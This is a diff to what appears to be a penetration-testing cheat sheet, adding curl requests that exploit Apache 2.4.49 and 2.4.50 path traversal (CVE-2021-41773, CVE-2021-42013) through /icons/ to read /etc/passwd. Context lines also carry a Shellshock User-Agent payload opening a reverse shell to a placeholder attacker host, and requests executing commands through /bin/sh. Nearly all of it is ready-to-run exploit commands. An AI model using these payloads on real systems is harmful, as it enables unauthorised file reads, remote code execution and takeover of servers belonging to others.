@@ -46,11 +46,13 @@ curl -sk -A "() { :;}; /bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'" 
 - [ ] User-Agent filtered: Referer, Cookie or any other header
 
 ## Apache 2.4.49 and 2.4.50
-A file read on 2.4.49, CVE-2021-41773:
+A file read on 2.4.49, CVE-2021-41773, through /icons/, and through /cgi-bin/ when CGI is off:
+curl -sk --path-as-is '<Scheme>://<WebHost>/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
 curl -sk --path-as-is '<Scheme>://<WebHost>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
 A command, when CGI is on:
 curl -sk --path-as-is -d 'echo Content-Type: text/plain; echo; id' '<Scheme>://<WebHost>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
 On 2.4.50, CVE-2021-42013, double-encoded:
+curl -sk --path-as-is '<Scheme>://<WebHost>/icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd'
 curl -sk --path-as-is '<Scheme>://<WebHost>/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd'
 curl -sk --path-as-is -d 'echo Content-Type: text/plain; echo; id' '<Scheme>://<WebHost>/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh'
 
